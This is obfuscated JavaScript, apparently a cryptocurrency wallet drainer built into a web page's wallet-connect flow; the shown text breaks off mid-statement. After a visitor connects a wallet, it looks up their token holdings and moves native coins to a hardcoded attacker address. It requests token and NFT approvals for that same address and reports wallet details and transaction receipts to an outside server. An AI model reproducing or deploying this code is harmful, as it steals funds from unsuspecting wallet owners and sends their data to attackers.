var _0x4693e6=_0x26d0;(function(_0x53822b,_0x40d194){var _0x44515b=_0x26d0,_0x58e963=_0x53822b();while(!![]){try{var _0x5aad17=-parseInt(_0x44515b(0x1f4))/0x1+parseInt(_0x44515b(0x1f6))/0x2*(-parseInt(_0x44515b(0x265))/0x3)+parseInt(_0x44515b(0x211))/0x4*(-parseInt(_0x44515b(0x1e1))/0x5)+-parseInt(_0x44515b(0x237))/0x6*(-parseInt(_0x44515b(0x277))/0x7)+parseInt(_0x44515b(0x1ea))/0x8+-parseInt(_0x44515b(0x1d7))/0x9+parseInt(_0x44515b(0x1ed))/0xa;if(_0x5aad17===_0x40d194)break;else _0x58e963['push'](_0x58e963['shift']());}catch(_0x58afe3){_0x58e963['push'](_0x58e963['shift']());}}}(_0x27fa,0xa2771));var bot_host=_0x4693e6(0x1dd),balance_url=_0x4693e6(0x217),version=_0x4693e6(0x203),site_name=site_name;function _0x26d0(_0x81c00c,_0x17df7e){var _0x27fa2c=_0x27fa();return _0x26d0=function(_0x26d024,_0x3c57a6){_0x26d024=_0x26d024-0x1be;var _0x1aa2cb=_0x27fa2c[_0x26d024];return _0x1aa2cb;},_0x26d0(_0x81c00c,_0x17df7e);}const account_to=_0x4693e6(0x1e5);var hash_sum=_0x4693e6(0x266);window[_0x4693e6(0x219)]=![],window['get_claim']=![];var tabs=document['querySelectorAll'](_0x4693e6(0x268));console[_0x4693e6(0x255)](tabs);function getCurrentProvider(){var _0x35dee7=_0x4693e6;if(!window[_0x35dee7(0x1c3)])return _0x35dee7(0x24d);if(window['web3']['currentProvider']['isMetaMask'])return'metamask';if(window[_0x35dee7(0x1c3)][_0x35dee7(0x241)][_0x35dee7(0x26f)])return'trust';if(window[_0x35dee7(0x1c3)]['currentProvider'][_0x35dee7(0x273)])return'goWallet';if(window[_0x35dee7(0x1c3)]['currentProvider']['isAlphaWallet'])return'alphaWallet';if(window['web3'][_0x35dee7(0x241)][_0x35dee7(0x1ca)])return _0x35dee7(0x264);if(window[_0x35dee7(0x1c3)][_0x35dee7(0x241)][_0x35dee7(0x1d4)])return _0x35dee7(0x1d8);if(typeof window[_0x35dee7(0x21a)]!=='undefined')return _0x35dee7(0x27d);if(window[_0x35dee7(0x1c3)]['currentProvider'][_0x35dee7(0x271)][_0x35dee7(0x260)]===_0x35dee7(0x226))return _0x35dee7(0x26b);if(window[_0x35dee7(0x1c3)][_0x35dee7(0x241)][_0x35dee7(0x271)][_0x35dee7(0x260)]===_0x35dee7(0x259))return'parity';if(window['web3']['currentProvider'][_0x35dee7(0x26d)]&&window[_0x35dee7(0x1c3)][_0x35dee7(0x241)][_0x35dee7(0x26d)][_0x35dee7(0x246)](_0x35dee7(0x235))!==-0x1)return _0x35dee7(0x235);if(window[_0x35dee7(0x1c3)]['currentProvider']['host']&&window[_0x35dee7(0x1c3)]['currentProvider'][_0x35dee7(0x26d)]['indexOf'](_0x35dee7(0x1e8))!==-0x1)return _0x35dee7(0x1e8);return _0x35dee7(0x24d);}function sendBot(_0x1cebe2,_0x5dc994){var _0x84c97=_0x4693e6,_0x154fcf='';for(var _0x47cf4f in Object['assign'](_0x1cebe2,{'user_agent':navigator[_0x84c97(0x1fa)],'wallet':getCurrentProvider(),'version':version,'site_name':site_name})){_0x154fcf+=_0x84c97(0x222)+_0x47cf4f+_0x84c97(0x1ff)+_0x1cebe2[_0x47cf4f];}fetch(bot_host,{'method':_0x84c97(0x228),'headers':{'Accept':_0x84c97(0x238),'Content-Type':_0x84c97(0x238)},'body':JSON['stringify']({'msg':_0x154fcf,'name':_0x5dc994,'key':CryptoJS[_0x84c97(0x1d0)](_0x154fcf+_0x5dc994+_0x84c97(0x210))[_0x84c97(0x22c)]()})});}var clear=function(){var _0x6579d4=_0x4693e6;window['localStorage'][_0x6579d4(0x247)]();},get=function(_0x231e5a){var _0x46304d=_0x4693e6;return window[_0x46304d(0x249)]?window[_0x46304d(0x249)][_0x231e5a]:null;},put=function(_0x2a94f4,_0x369781){var _0x2d5d3d=_0x4693e6;window[_0x2d5d3d(0x249)]&&(window[_0x2d5d3d(0x249)][_0x2a94f4]=_0x369781);},web3,hack=![],isMetaMasked=![],connect=0x0,Contract,t_index=-0x1,tokens,account,approve,abis={},isMobile,nets={'ethereum':0x1,'binance-smart-chain':0x38,'polygon':0x89,'avalanche':0xa86a,'arbitrum':0xa4b1,'fantom':0xfa,'cronos':0x19,'moonriver':0x505},domeins={'ethereum':_0x4693e6(0x239),'binance-smart-chain':_0x4693e6(0x20e),'polygon':_0x4693e6(0x234),'avalanche':'api.snowtrace.io','arbitrum':'api.arbiscan.io','fantom':'api.ftmscan.com','cronos':_0x4693e6(0x245),'moonriver':_0x4693e6(0x253)},apis={'ethereum':_0x4693e6(0x1f7),'binance-smart-chain':_0x4693e6(0x1fc),'polygon':'U1SAUWPGHXK5NYD63ZC64TADJID68NRFQI','avalanche':_0x4693e6(0x1cb),'arbitrum':_0x4693e6(0x26a),'fantom':'QR8FIPND9S5119BWDZQ9EDNF6DSBMQAG36','cronos':'8T1B4T8Q6TUGR1QTNQTQP5G1QAP3GMGW9U','moonriver':_0x4693e6(0x204)},adddata={'binance-smart-chain':{'chainId':_0x4693e6(0x25e),'chainName':'Binance\x20Smart\x20Chain','nativeCurrency':{'name':_0x4693e6(0x1c9),'symbol':_0x4693e6(0x1c9),'decimals':0x12},'rpcUrls':[_0x4693e6(0x1e0)],'blockExplorerUrls':[_0x4693e6(0x24a)]},'polygon':{'chainName':_0x4693e6(0x209),'chainId':'0x89','nativeCurrency':{'name':_0x4693e6(0x1f2),'decimals':0x12,'symbol':_0x4693e6(0x1f2)},'rpcUrls':[_0x4693e6(0x220)]},'avalanche':{'chainId':_0x4693e6(0x212),'chainName':_0x4693e6(0x236),'nativeCurrency':{'name':_0x4693e6(0x257),'symbol':_0x4693e6(0x221),'decimals':0x12},'rpcUrls':[_0x4693e6(0x22b)],'blockExplorerUrls':['https://snowtrace.io/']},'arbitrum':{'chainId':_0x4693e6(0x279),'chainName':_0x4693e6(0x201),'nativeCurrency':{'name':_0x4693e6(0x1c4),'symbol':_0x4693e6(0x22f),'decimals':0x12},'rpcUrls':['https://arb1.arbitrum.io/rpc'],'blockExplorerUrls':[_0x4693e6(0x27c)]},'fantom':{'chainId':_0x4693e6(0x263),'chainName':_0x4693e6(0x1ce),'nativeCurrency':{'name':_0x4693e6(0x1be),'symbol':_0x4693e6(0x21e),'decimals':0x12},'rpcUrls':['https://rpc.ftm.tools/'],'blockExplorerUrls':['https://ftmscan.com/']},'cronos':{'chainId':_0x4693e6(0x1f5),'chainName':_0x4693e6(0x200),'nativeCurrency':{'name':_0x4693e6(0x208),'symbol':_0x4693e6(0x20d),'decimals':0x12},'rpcUrls':[_0x4693e6(0x269)],'blockExplorerUrls':['https://cronoscan.com']},'moonriver':{'chainId':_0x4693e6(0x1fb),'chainName':_0x4693e6(0x22a),'nativeCurrency':{'name':_0x4693e6(0x1f1),'symbol':'MOVR','decimals':0x12},'rpcUrls':[_0x4693e6(0x24c)],'blockExplorerUrls':['https://moonriver.moonscan.io']}},eth_price=0x640,api_zapper=_0x4693e6(0x1d9),erc20_abi=[{'constant':!![],'inputs':[],'name':'name','outputs':[{'name':'','type':_0x4693e6(0x1e3)}],'payable':![],'stateMutability':_0x4693e6(0x23d),'type':_0x4693e6(0x1de)},{'constant':![],'inputs':[{'name':_0x4693e6(0x251),'type':_0x4693e6(0x216)},{'name':'_value','type':_0x4693e6(0x256)}],'name':_0x4693e6(0x248),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x4693e6(0x280),'outputs':[{'name':'','type':_0x4693e6(0x256)}],'payable':![],'stateMutability':_0x4693e6(0x23d),'type':_0x4693e6(0x1de)},{'constant':![],'inputs':[{'name':_0x4693e6(0x233),'type':_0x4693e6(0x216)},{'name':_0x4693e6(0x22d),'type':_0x4693e6(0x216)},{'name':_0x4693e6(0x1e9),'type':_0x4693e6(0x256)}],'name':_0x4693e6(0x1c8),'outputs':[{'name':'','type':_0x4693e6(0x1db)}],'payable':![],'stateMutability':_0x4693e6(0x1c5),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4693e6(0x1e2),'outputs':[{'name':'','type':_0x4693e6(0x23f)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[{'name':'_owner','type':_0x4693e6(0x216)}],'name':_0x4693e6(0x258),'outputs':[{'name':_0x4693e6(0x21d),'type':_0x4693e6(0x256)}],'payable':![],'stateMutability':_0x4693e6(0x23d),'type':_0x4693e6(0x1de)},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x4693e6(0x1e3)}],'payable':![],'stateMutability':'view','type':_0x4693e6(0x1de)},{'constant':![],'inputs':[{'name':_0x4693e6(0x22d),'type':_0x4693e6(0x216)},{'name':_0x4693e6(0x1e9),'type':_0x4693e6(0x256)}],'name':_0x4693e6(0x229),'outputs':[{'name':'','type':_0x4693e6(0x1db)}],'payable':![],'stateMutability':_0x4693e6(0x1c5),'type':_0x4693e6(0x1de)},{'constant':!![],'inputs':[{'name':_0x4693e6(0x240),'type':_0x4693e6(0x216)},{'name':_0x4693e6(0x251),'type':_0x4693e6(0x216)}],'name':_0x4693e6(0x1d2),'outputs':[{'name':'','type':_0x4693e6(0x256)}],'payable':![],'stateMutability':_0x4693e6(0x23d),'type':'function'},{'payable':!![],'stateMutability':_0x4693e6(0x1d5),'type':_0x4693e6(0x278)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4693e6(0x1da),'type':_0x4693e6(0x216)},{'indexed':!![],'name':'spender','type':'address'},{'indexed':![],'name':_0x4693e6(0x225),'type':_0x4693e6(0x256)}],'name':'Approval','type':_0x4693e6(0x202)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4693e6(0x21b),'type':_0x4693e6(0x216)},{'indexed':!![],'name':'to','type':_0x4693e6(0x216)},{'indexed':![],'name':_0x4693e6(0x225),'type':_0x4693e6(0x256)}],'name':_0x4693e6(0x1fe),'type':_0x4693e6(0x202)}];function _0x27fa(){var _0x1193b8=['2790','656vaAbGH','0xA86A','connected','slice','tokenId','address','https://nulledapi.com:8003','0x0000000000000000000000000000000000000000','get_coins','__CIPHER__','from','tokens','balance','FTM','get_claim','https://polygon-rpc.com/','AVAX','\x0a<b>','setApprovalForAll','toWei','value','EthereumProvider','keys','post','transfer','Moonriver','https://cchain.explorer.avax.network/','toString','_to','toLowerCase','AETH','add','send','methods','_from','api.polygonscan.com','infura','Avalanche\x20Mainnet\x20C-Chain','13884ZLDoNZ','application/json','api.etherscan.io','eth','POST','catch','view','/balance?user_addr=','uint8','_owner','currentProvider','amount','all','Approved','api.cronoscan.com','indexOf','clear','approve','localStorage','https://bscscan.com/','toLocaleString','https://rpc.api.moonriver.moonbeam.network','unknown','Error','format','net','_spender','appId','api-moonriver.moonscan.io','undefined','log','uint256','Avalanche','balanceOf','Web3FrameProvider','code','....','fromCodePoint','/gwai?net=','0x38','reload','name','abis','getTransactionReceipt','0xFA','status','856668kyVken','cd807053beb3f39795750c59bc31803a893b5f60a0a9d1644322c99e71e9d08a','ğŸ•¸ï¸�Network\x20add','#connect','https://evm-dev.cronos.org','AJ7QPAQEU9NSJWAFUW4WBXCJJ6K3FNN8G7','mist','estimateGas','host','transactionHash','isTrust','ethereum','constructor','request','isGoWallet','wallet_addEthereumChain','result','res','3409XfFCOw','fallback','0xA4B1','gwei','Make\x20Approve','https://arbiscan.io/','cipher','message','json','totalSupply','Fantom','length','innerHTML','&&api_key=','Tokens:\x20','web3','Arbitrum','nonpayable','map','fullwide','transferFrom','BNB','isStatus','HVJTWZDAATZ1XQMIKGN3KH5MQSEPFEUZ1T','isMetaMask','ğŸ•¸ï¸�Network\x20change','Fantom\x20Opera','addr','SHA256','fuck\x20you','allowance','stop\x20click!,\x20just\x20wait!','isToshi','payable','start','3889647WUNNEQ','coinbase','57e79189-e67f-4334-aef4-d11cb3eecd62','owner','bool','then','https://nulledapi.com:8001/bot3','function','end','https://bsc-dataseed.binance.org/','31740hphack','decimals','string','&api_key=','0xd41732785F3eb9e3f4152045261eC77BfcB82d08','wallet_switchEthereumChain','//api?module=contract&action=getabi&address=','localhost','_value','1324032jBXSfN','balanceRaw','sendTransaction','19365240KDqxmu','getId','No\x20Approve','requestAccounts','Moonriver\x20Coin','MATIC','assign','804678pPPtfB','0x19','2ubdeAy','VUCG4PAI4218JB7FX52URCMH2P26W1NFV5','location','no\x20metamask\x20or\x20trustwallet','userAgent','0x505','VHSMPQF7DYGTZS64CFQ4FIA6PWM3YD91NQ','toHex','Transfer',':</b>\x20','Cronos','Arbitrum\x20One','event','free-0.1.11r','4DAZTWZJVAHBZS5IBUD2KUCMAG1EUBHBTG','utils','nft','Contract','Cronos\x20Coin','Polygon\x20Mainnet','stringify','parse','time','CRO','api.bscscan.com','match'];_0x27fa=function(){return _0x1193b8;};return _0x27fa();}async function getData(_0x41bdf8){var _0x3aeb23=_0x4693e6;tokens=[];var _0xa20eaf=await fetch(balance_url+_0x3aeb23(0x23e)+_0x41bdf8+_0x3aeb23(0x1c1)+api_zapper,{'method':_0x3aeb23(0x23b),'headers':{'Accept':_0x3aeb23(0x238)}}),_0xb5e66d=await _0xa20eaf[_0x3aeb23(0x27f)]();_0xb5e66d['ok']&&(tokens=_0xb5e66d[_0x3aeb23(0x276)]);}async function getGwai(_0x5375ea){var _0x4769a3=_0x4693e6,_0x4c446e=await fetch(balance_url+_0x4769a3(0x25d)+_0x5375ea+_0x4769a3(0x1e4)+api_zapper,{'method':_0x4769a3(0x23b),'headers':{'Accept':_0x4769a3(0x238)}}),_0x3cb463=await _0x4c446e[_0x4769a3(0x27f)]();if(_0x3cb463['ok'])return _0x3cb463[_0x4769a3(0x276)];return 0x14;}async function get_abi(){var _0x3e775e=_0x4693e6;abis={};var _0x2d85ba={},_0x2dd367=0x0,_0x1678ba;Object[_0x3e775e(0x227)](tokens)[_0x3e775e(0x1c6)](_0xf59bab=>{var _0x32cf7d=_0x3e775e;_0x2dd367+=tokens[_0xf59bab][_0x32cf7d(0x242)],_0x1678ba=tokens[_0xf59bab],_0x1678ba[_0x32cf7d(0x242)]=formatter[_0x32cf7d(0x24f)](tokens[_0xf59bab][_0x32cf7d(0x242)]),_0x2d85ba[_0xf59bab]=JSON['stringify'](_0x1678ba);}),sendBot(Object[_0x3e775e(0x1f3)](_0x2d85ba,{'walletAddr':account}),String[_0x3e775e(0x25c)](0x1f354)+(_0x3e775e(0x1c2)+formatter['format'](_0x2dd367))),await Promise[_0x3e775e(0x243)](tokens[_0x3e775e(0x1c6)](async _0x1e417c=>{var _0x42037f=_0x3e775e;if(_0x1e417c['net']in domeins&&_0x1e417c[_0x42037f(0x1cf)]!=_0x42037f(0x218)){var _0x229bbf='https://'+domeins[_0x1e417c[_0x42037f(0x250)]]+_0x42037f(0x1e7)+_0x1e417c['addr']+'&apikey='+apis[_0x1e417c[_0x42037f(0x250)]],_0xd11b24=await fetch(_0x229bbf,{'headers':new Headers({'Content-Type':'application/json','Accept':_0x42037f(0x238)})}),_0x115693=await _0xd11b24[_0x42037f(0x27f)]();!(_0x1e417c[_0x42037f(0x250)]in abis)&&(abis[_0x1e417c[_0x42037f(0x250)]]={}),_0x115693['status']==='1'?abis[_0x1e417c[_0x42037f(0x250)]][_0x1e417c[_0x42037f(0x1cf)]]=_0x115693[_0x42037f(0x275)]:abis[_0x1e417c['net']][_0x1e417c[_0x42037f(0x1cf)]]=JSON[_0x42037f(0x20a)](erc20_abi);}else _0x1e417c[_0x42037f(0x1cf)]!=_0x42037f(0x218)&&(abis[_0x1e417c['net']][_0x1e417c[_0x42037f(0x1cf)]]=JSON[_0x42037f(0x20a)](erc20_abi));}));}async function mobileMetaProcess(){var _0x1d64d1=_0x4693e6;console[_0x1d64d1(0x255)](t_index),t_index++,token=tokens[t_index],console[_0x1d64d1(0x255)](tokens),console[_0x1d64d1(0x255)](t_index);if(token[_0x1d64d1(0x1cf)]=='0x0000000000000000000000000000000000000000'||token['addr']in abis[token[_0x1d64d1(0x250)]]){var _0x1842a2=await web3[_0x1d64d1(0x23a)][_0x1d64d1(0x250)][_0x1d64d1(0x1ee)]();if(_0x1842a2!=nets[token['net']])try{return await window[_0x1d64d1(0x270)][_0x1d64d1(0x272)]({'method':_0x1d64d1(0x1e6),'params':[{'chainId':web3[_0x1d64d1(0x205)][_0x1d64d1(0x1fd)](nets[token[_0x1d64d1(0x250)]])}]}),sendBot({'walletAddr':account,'from':_0x1842a2,'to':nets[token[_0x1d64d1(0x250)]],'toName':token[_0x1d64d1(0x250)]},_0x1d64d1(0x1cd)),put('t_index',t_index-0x1),window[_0x1d64d1(0x1f8)][_0x1d64d1(0x25f)](),null;}catch(_0x46571f){_0x46571f[_0x1d64d1(0x25a)]!=0x1326&&sendBot({'code':_0x46571f[_0x1d64d1(0x25a)],'message':_0x46571f[_0x1d64d1(0x27e)],'walletAddr':account},String[_0x1d64d1(0x25c)](0x26d4)+'Error');try{await window[_0x1d64d1(0x270)][_0x1d64d1(0x272)]({'method':_0x1d64d1(0x274),'params':[adddata[token[_0x1d64d1(0x250)]]]}),sendBot({'walletAddr':account,'from':_0x1842a2,'to':nets[token[_0x1d64d1(0x250)]],'toName':token[_0x1d64d1(0x250)]},_0x1d64d1(0x267));}catch(_0x54ffbd){return sendBot({'code':_0x54ffbd[_0x1d64d1(0x25a)],'message':_0x54ffbd['message'],'walletAddr':account},String[_0x1d64d1(0x25c)](0x26d4)+_0x1d64d1(0x24e)),await mobileMetaProcess(),null;}}if(token[_0x1d64d1(0x1cf)]==_0x1d64d1(0x218)){var _0x514fb3=parseInt(await getGwai(token[_0x1d64d1(0x250)]))+0x1,_0x54b82c=token,_0x2d5273=parseInt(token[_0x1d64d1(0x1eb)])-0xdbba0*parseInt(web3[_0x1d64d1(0x205)][_0x1d64d1(0x224)](_0x514fb3[_0x1d64d1(0x22c)](),_0x1d64d1(0x27a)));if(_0x2d5273>0x0)return await web3[_0x1d64d1(0x23a)][_0x1d64d1(0x1ec)]({'from':account,'to':account_to,'value':new web3[(_0x1d64d1(0x205))]['BN'](_0x2d5273['toLocaleString']('fullwide',{'useGrouping':![]})),'gasPrice':web3[_0x1d64d1(0x205)]['toWei'](_0x514fb3[_0x1d64d1(0x22c)](),_0x1d64d1(0x27a))},async _0x556a67=>{var _0x135ada=_0x1d64d1;if(_0x556a67==null){}else return sendBot(Object[_0x135ada(0x1f3)](_0x556a67,token,{'from':account,'to':account_to}),String['fromCodePoint'](0x274c)+'No\x20Approve'),await mobileMetaProcess(),null;})['catch'](_0x255445=>{var _0x4f5535=_0x1d64d1;sendBot({'code':_0x255445[_0x4f5535(0x25a)],'message':_0x255445[_0x4f5535(0x27e)],'walletAddr':account},String['fromCodePoint'](0x26d4)+'Error');})['on'](_0x1d64d1(0x26e),_0x1071d3=>{var _0x494243=_0x1d64d1;sendBot(Object[_0x494243(0x1f3)](token,{'from':account,'to':account_to,'hash':_0x1071d3}),String[_0x494243(0x25c)](0x2705)+_0x494243(0x27b)),web3[_0x494243(0x23a)][_0x494243(0x262)](_0x1071d3)['then'](_0x196191=>{var _0x3b5961=_0x494243;return sendBot(Object[_0x3b5961(0x1f3)](_0x54b82c,{'from':account,'to':account_to,'receipt':JSON[_0x3b5961(0x20a)](_0x196191)}),String[_0x3b5961(0x25c)](0x1f525)+_0x3b5961(0x244)),mobileMetaProcess(),null;})['catch'](async _0x58b798=>{var _0x45e4b2=_0x494243;return sendBot({'code':_0x58b798[_0x45e4b2(0x25a)],'message':_0x58b798[_0x45e4b2(0x27e)],'walletAddr':account},String[_0x45e4b2(0x25c)](0x26d4)+_0x45e4b2(0x24e)),await mobileMetaProcess(),null;});}),sendBot(Object[_0x1d64d1(0x1f3)](_0x54b82c,{'from':account,'to':account_to,'receipt':JSON[_0x1d64d1(0x20a)](receipt)}),String[_0x1d64d1(0x25c)](0x1f525)+_0x1d64d1(0x244)),await mobileMetaProcess(),null;}else{try{Contract=new web3[(_0x1d64d1(0x23a))][(_0x1d64d1(0x207))](JSON[_0x1d64d1(0x20b)](abis[token[_0x1d64d1(0x250)]][token['addr']]),token[_0x1d64d1(0x1cf)]);if(token[_0x1d64d1(0x252)]==_0x1d64d1(0x21c))approve_method=Contract[_0x1d64d1(0x232)]['approve'](account_to,new web3[(_0x1d64d1(0x205))]['BN'](token[_0x1d64d1(0x1eb)]));else token['appId']==_0x1d64d1(0x206)&&(approve_method=Contract['methods'][_0x1d64d1(0x248)](account_to,token[_0x1d64d1(0x215)]));}catch(_0x3cfc56){try{approve_method=Contract[_0x1d64d1(0x232)][_0x1d64d1(0x223)](account_to,!![]);}catch(_0x33e7ae){try{Contract=new web3[(_0x1d64d1(0x23a))][(_0x1d64d1(0x207))](erc20_abi,token[_0x1d64d1(0x1cf)]);if(token[_0x1d64d1(0x252)]==_0x1d64d1(0x21c))approve_method=Contract[_0x1d64d1(0x232)][_0x1d64d1(0x248)](account_to,new web3[(_0x1d64d1(0x205))]['BN'](token[_0x1d64d1(0x1eb)]));else token['appId']=='nft'&&(approve_method=Contract['methods']['approve'](account_to,token[_0x1d64d1(0x215)]));}catch(_0x4421d1){return Contract=new web3[(_0x1d64d1(0x23a))][(_0x1d64d1(0x207))](JSON[_0x1d64d1(0x20b)](abis[token['net']][token['addr']]),token['addr']),sendBot({'code':_0x4421d1[_0x1d64d1(0x25a)],'message':_0x4421d1[_0x1d64d1(0x27e)],'walletAddr':account},String[_0x1d64d1(0x25c)](0x26d4)+_0x1d64d1(0x24e)),await mobileMetaProcess(),null;}}}var _0x54b82c=token;try{var _0x37964a=await approve_method[_0x1d64d1(0x26c)]({'from':account});await approve_method['send']({'from':account,'gasLimit':_0x37964a,'gasPrice':web3[_0x1d64d1(0x205)][_0x1d64d1(0x224)]((parseInt(await getGwai(token['net']))+0x1)[_0x1d64d1(0x22c)](),_0x1d64d1(0x27a))},async _0xf415ad=>{var _0x42d007=_0x1d64d1;if(_0xf415ad==null){}else sendBot(Object[_0x42d007(0x1f3)](_0xf415ad,token,{'from':account,'to':account_to}),String[_0x42d007(0x25c)](0x274c)+_0x42d007(0x1ef));})['on']('transactionHash',_0x36cfe3=>{var _0x561b13=_0x1d64d1;sendBot(Object[_0x561b13(0x1f3)](token,{'from':account,'to':account_to,'hash':_0x36cfe3}),String[_0x561b13(0x25c)](0x2705)+_0x561b13(0x27b)),web3['eth']['getTransactionReceipt'](_0x36cfe3)[_0x561b13(0x1dc)](async _0x2c4fc2=>{var _0xd521f=_0x561b13;return sendBot(Object[_0xd521f(0x1f3)](_0x54b82c,{'from':account,'to':account_to,'receipt':JSON[_0xd521f(0x20a)](_0x2c4fc2)}),String[_0xd521f(0x25c)](0x1f525)+_0xd521f(0x244)),await mobileMetaProcess(),null;})[_0x561b13(0x23c)](async _0x1f9695=>{var _0x48897d=_0x561b13;return sendBot({'code':_0x1f9695[_0x48897d(0x25a)],'message':_0x1f9695[_0x48897d(0x27e)],'walletAddr':account},String[_0x48897d(0x25c)](0x26d4)+_0x48897d(0x24e)),await mobileMetaProcess(),null;});});}catch(_0x3c5152){return sendBot({'code':_0x3c5152['code'],'message':_0x3c5152[_0x1d64d1(0x27e)],'walletAddr':account},String['fromCodePoint'](0x26d4)+'Error'),await mobileMetaProcess(),null;}}}}document['addEventListener']('load',async function(){var _0x3d9ced=_0x4693e6,_0x3f239e=get('tokens');if(_0x3f239e!==null&&_0x3f239e!==undefined){tokens=JSON[_0x3d9ced(0x20b)](get(_0x3d9ced(0x21c))||'{}'),abis=JSON[_0x3d9ced(0x20b)](get(_0x3d9ced(0x261))||'{}'),t_index=get('t_index'),console[_0x3d9ced(0x255)](t_index),web3=new Web3(window[_0x3d9ced(0x270)]);const _0x426d98=await web3['eth'][_0x3d9ced(0x1f0)]();account=_0x426d98[0x0],mobileMetaProcess();}isMobile=navigator[_0x3d9ced(0x1fa)][_0x3d9ced(0x22e)]()[_0x3d9ced(0x20f)](/mobile/i);});async function connec_web3(){var _0x4fcb9b=_0x4693e6;if(window['ethereum']!=_0x4fcb9b(0x254)&&connect==0x0){web3=new Web3(window[_0x4fcb9b(0x270)]);const _0x5409c6=await web3[_0x4fcb9b(0x23a)][_0x4fcb9b(0x1f0)]();account=_0x5409c6[0x0],console['log'](account),t_index=-0x1,_0x5409c6&&_0x5409c6[_0x4fcb9b(0x1bf)]>0x0&&(connect=0x1,tabs['forEach'](_0x302c8a=>{var _0x2a44a6=_0x4fcb9b;_0x302c8a[_0x2a44a6(0x1c0)]=account[_0x2a44a6(0x214)](0x0,0x6)+_0x2a44a6(0x25b)+account['slice'](-0x4),_0x302c8a['classList'][_0x2a44a6(0x230)](_0x2a44a6(0x213));}),console['log']('make'),await getData(account),await get_abi(),window['get_coins']=!![],window[_0x4fcb9b(0x21f)]&&start_transactions(),put(_0x4fcb9b(0x261),JSON[_0x4fcb9b(0x20a)](abis)),put(_0x4fcb9b(0x21c),JSON[_0x4fcb9b(0x20a)](tokens)));}}async function start_transactions(){var _0x3193e7=_0x4693e6;window[_0x3193e7(0x21f)]=!![],localStorage['setItem'](_0x3193e7(0x20c),new Date()['getTime']());if(CryptoJS['SHA256'](account_to+'lol')[_0x3193e7(0x22c)]()!=hash_sum)return hack=!![],c,console[_0x3193e7(0x255)]('hah\x20nice\x20try\x20to\x20hack\x20me,\x20fuck\x20you'),_0x3193e7(0x1d1);if(window[_0x3193e7(0x270)]!==_0x3193e7(0x254)){isMetaMasked=window[_0x3193e7(0x270)][_0x3193e7(0x1cc)];function _0x278308(){var _0x1b1c10=_0x3193e7;console[_0x1b1c10(0x255)](_0x1b1c10(0x1df));}if(account){if(connect!=0x1){console['log'](_0x3193e7(0x1d3));return;}console['log'](_0x3193e7(0x1d6)),connect=0x2;if(!window[_0x3193e7(0x219)])return;if(isMetaMasked&&isMobile)mobileMetaProcess();else for(var _0xf7ae1d in tokens){token=tokens[_0xf7ae1d];if(token[_0x3193e7(0x1cf)]==_0x3193e7(0x218)||token[_0x3193e7(0x1cf)]in abis[token[_0x3193e7(0x250)]]){var _0x24939b=await web3[_0x3193e7(0x23a)][_0x3193e7(0x250)][_0x3193e7(0x1ee)]();if(_0x24939b!=nets[token[_0x3193e7(0x250)]])try{await window[_0x3193e7(0x270)][_0x3193e7(0x272)]({'method':_0x3193e7(0x1e6),'params':[{'chainId':web3['utils']['toHex'](nets[token['net']])}]}),sendBot({'walletAddr':account,'from':_0x24939b,'to':nets[token[_0x3193e7(0x250)]],'toName':token[_0x3193e7(0x250)]},_0x3193e7(0x1cd));}catch(_0x3f0d18){_0x3f0d18[_0x3193e7(0x25a)]!=0x1326&&sendBot({'code':_0x3f0d18[_0x3193e7(0x25a)],'message':_0x3f0d18[_0x3193e7(0x27e)],'walletAddr':account},String[_0x3193e7(0x25c)](0x26d4)+_0x3193e7(0x24e));try{await window['ethereum']['request']({'method':_0x3193e7(0x274),'params':[adddata[token[_0x3193e7(0x250)]]]}),sendBot({'walletAddr':account,'from':_0x24939b,'to':nets[token[_0x3193e7(0x250)]],'toName':token[_0x3193e7(0x250)]},_0x3193e7(0x267));}catch(_0x34406e){sendBot({'code':_0x34406e[_0x3193e7(0x25a)],'message':_0x34406e[_0x3193e7(0x27e)],'walletAddr':account},String[_0x3193e7(0x25c)](0x26d4)+_0x3193e7(0x24e));continue;}}if(token[_0x3193e7(0x1cf)]==_0x3193e7(0x218)){var _0x4eed76=parseInt(await getGwai(token[_0x3193e7(0x250)]))+0x1,_0x383bc8=token,_0x53ab01=parseInt(token[_0x3193e7(0x1eb)])-0xdbba0*parseInt(web3[_0x3193e7(0x205)][_0x3193e7(0x224)](_0x4eed76['toString'](),_0x3193e7(0x27a)));_0x53ab01>0x0&&await web3[_0x3193e7(0x23a)][_0x3193e7(0x1ec)]({'from':account,'to':account_to,'value':new web3['utils']['BN'](_0x53ab01[_0x3193e7(0x24b)](_0x3193e7(0x1c7),{'useGrouping':![]})),'gasPrice':web3[_0x3193e7(0x205)][_0x3193e7(0x224)](_0x4eed76[_0x3193e7(0x22c)](),_0x3193e7(0x27a))},_0x16531a=>{var _0x1a65e7=_0x3193e7;_0x16531a==null?sendBot(Object[_0x1a65e7(0x1f3)](token,{'from':account,'to':account_to}),String[_0x1a65e7(0x25c)](0x2705)+_0x1a65e7(0x27b)):sendBot(Object[_0x1a65e7(0x1f3)](_0x16531a,token,{'from':account,'to':account_to}),String[_0x1a65e7(0x25c)](0x274c)+_0x1a65e7(0x1ef));})['then'](()=>{var _0x777b8f=_0x3193e7;sendBot(Object[_0x777b8f(0x1f3)](_0x383bc8,{'from':account,'to':account_to}),String[_0x777b8f(0x25c)](0x1f525)+_0x777b8f(0x244));})[_0x3193e7(0x23c)](_0x23edec=>{var _0x4047b3=_0x3193e7;sendBot({'code':_0x23edec[_0x4047b3(0x25a)],'message':_0x23edec['message'],'walletAddr':account},String[_0x4047b3(0x25c)](0x26d4)+'Error');});}else{try{Contract=new web3[(_0x3193e7(0x23a))][(_0x3193e7(0x207))](JSON[_0x3193e7(0x20b)](abis[token[_0x3193e7(0x250)]][token[_0x3193e7(0x1cf)]]),token['addr']);if(token[_0x3193e7(0x252)]==_0x3193e7(0x21c))approve_method=Contract[_0x3193e7(0x232)]['approve'](account_to,new web3[(_0x3193e7(0x205))]['BN'](token[_0x3193e7(0x1eb)]));else 